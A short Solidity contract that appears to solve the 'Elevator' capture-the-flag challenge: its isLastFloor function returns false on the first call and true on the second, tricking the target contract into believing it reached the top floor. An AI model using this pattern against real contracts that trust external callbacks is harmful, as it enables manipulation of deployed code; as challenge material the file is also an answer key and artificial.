// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../Challenge/Elevator.sol";

contract BuildingWithElevator {
    Elevator elevator;
    bool top;

    constructor(address _elevatorAddress) public {
        elevator = Elevator(_elevatorAddress);
        top = false;
    }

    function goTo(uint256 _floor) external {
        elevator.goTo(_floor);
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        if (!top) {
            top = true;
            return false;
        }
        if (top) {
            return true;
        }
    }
}
